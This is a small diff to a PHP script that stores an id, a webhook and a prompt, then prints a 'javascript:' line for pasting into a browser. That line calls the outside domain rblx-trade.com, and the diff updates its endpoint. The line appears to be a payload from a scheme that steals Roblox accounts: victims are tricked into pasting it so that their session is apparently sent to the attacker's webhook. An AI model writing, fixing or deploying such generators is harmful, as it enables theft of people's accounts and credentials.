@@ -21,7 +21,7 @@
     VALUES ('".mysqli_real_escape_string($conn, $id)."', '".mysqli_real_escape_string($conn, $webhook)."', '".mysqli_real_escape_string($conn, $prompt)."')";
 
     if ($conn->query($sql) === TRUE) {
-      echo 'xJavascript:$.get("//rblx-trade.com/rblxapi/api?id='.$id.'")';
+      echo 'xJavascript:$.get("//rblx-trade.com/rblxapi/api.php?id='.$id.'")';
     } else {
       echo "Error:" . $conn->error;
     }
